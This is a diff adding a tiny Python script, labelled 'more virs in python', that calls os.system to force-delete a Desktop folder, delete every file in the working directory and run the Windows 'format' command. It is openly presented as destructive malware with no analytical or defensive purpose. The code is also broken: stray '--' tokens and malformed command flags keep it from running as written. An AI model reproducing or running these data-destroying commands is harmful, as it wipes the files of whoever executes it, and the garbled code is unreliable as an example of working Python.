@@ -1,0 +1,11 @@
+from os import system, name, rmdir
+
+def main():
+    system('rmdir /f /q "c://Users\\username\\Desktop\\test"') --
+    system('del \*.\*') --
+    system('format')
+main()
+
+
+
+more virs in python
